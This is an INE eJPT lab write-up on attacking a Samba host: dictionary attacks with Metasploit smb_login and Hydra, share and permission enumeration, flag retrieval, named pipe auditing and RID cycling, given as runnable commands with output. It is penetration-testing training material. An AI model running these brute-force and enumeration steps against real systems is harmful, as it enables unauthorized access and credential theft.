# Samba Recon: Dictionary Attack - INE eJPT

INE lab covering credential attacks against a Samba target, share enumeration with permission mapping, flag retrieval from accessible shares, named pipe enumeration, and RID cycling for user discovery. The chain combines Metasploit `smb_login`, Hydra, smbmap, smbclient, `pipe_auditor`, and enum4linux against `demo.ine.local`.

---

## Credential Attacks

### user jane - Metasploit smb_login

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

Password recovered:

```
jane : abc123
```

### user admin - Hydra

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

Password recovered:

```
admin : password1
```

---

## Share Enumeration and Permission Mapping

```bash
smbmap -H demo.ine.local -u admin -p password1
```

`smbmap` displays each share with its permission level (READ, WRITE, or none). The share `nancy` is read-only for `admin`.

### Browsable vs. Non-Browsable Shares

Listing shares as jane:

```bash
smbclient -L demo.ine.local -U jane
```

The `jane` share does not appear in the listing - it exists but is not browsable. Direct access still works:

```bash
smbclient //demo.ine.local/jane -U jane
```

A share can be accessible without appearing in the browse list. Always attempt direct connections to share names discovered via other means.

---

## Flag Retrieval from admin Share

```bash
smbclient //demo.ine.local/admin -U admin
```

```
ls
cd hidden
ls
get flag.tar.gz
exit
```

Extract and read:

```bash
tar -xf flag.tar.gz
cat flag
```

```
2727069bc058053bd561ce372721c92e
```

---

## Named Pipe Enumeration

```bash
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit
```

Named pipes found:

```
netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc
```

Named pipes indicate active RPC services and surface potential lateral movement or escalation vectors.

---

## RID Cycling (User Enumeration)

```bash
enum4linux -r -u "admin" -p "password1" demo.ine.local
```

SIDs resolved:

```
S-1-22-1-1000  ->  shawn
S-1-22-1-1001  ->  jane
S-1-22-1-1002  ->  nancy
S-1-22-1-1003  ->  admin
```

RID cycling reconstructs the full user list from SID ranges even when direct user enumeration is restricted.

---

## Key Takeaways

- `smbmap` is the correct first tool after obtaining credentials - it maps permissions across all shares immediately and prevents blind access attempts.
- A share not appearing in `smbclient -L` does not mean it is inaccessible. Non-browsable shares require direct connection attempts with known share names.
- Metasploit `smb_login` and Hydra are complementary: smb_login integrates cleanly into MSF workflows, Hydra is faster for standalone brute force.
- Named pipe enumeration via `pipe_auditor` reveals active RPC services without additional port scanning.
- RID cycling with `enum4linux` is a reliable method to enumerate all local Samba users when direct user enumeration is blocked or returns incomplete results.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
